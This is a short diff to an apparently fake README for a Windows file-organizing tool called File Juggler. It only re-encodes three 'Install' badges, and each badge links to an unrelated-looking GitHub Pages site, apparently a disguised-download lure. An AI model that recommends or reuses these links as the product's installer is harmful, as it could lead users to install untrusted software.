@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install File Juggler](https://img.shields.io/badge/⬇_Install_File%20Juggler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install File Juggler](https://img.shields.io/badge/⬇_Install_File+Juggler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ File Juggler is a Windows utility for automating file organization tasks using r
 
 <div align="center">
 
-[![⬇ Install File Juggler](https://img.shields.io/badge/⬇_Install_File%20Juggler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install File Juggler](https://img.shields.io/badge/⬇_Install_File+Juggler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ File Juggler is a Windows utility for automating file organization tasks using r
 
 <div align="center">
 
-[![⬇ Install File Juggler](https://img.shields.io/badge/⬇_Install_File%20Juggler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install File Juggler](https://img.shields.io/badge/⬇_Install_File+Juggler-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
